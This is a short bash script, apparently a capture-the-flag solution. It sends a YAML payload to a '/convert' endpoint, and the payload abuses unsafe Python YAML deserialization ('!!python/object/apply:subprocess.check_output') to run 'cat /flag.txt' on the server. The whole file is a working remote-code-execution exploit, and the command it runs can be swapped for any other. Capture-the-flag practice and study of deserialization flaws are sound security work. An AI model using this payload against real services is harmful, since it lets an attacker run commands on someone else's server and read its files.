#!/usr/bin/env bash
set -euo pipefail

target="${1:-https://5d023d5116435344.chal.ctf.ae}"

curl -k -sS -X POST \
  "${target%/}/convert" \
  -H "Content-Type: application/json" \
  --data '{"yaml_input":"!!python/object/apply:subprocess.check_output [[\"cat\", \"/flag.txt\"]]"}'
printf '\n'
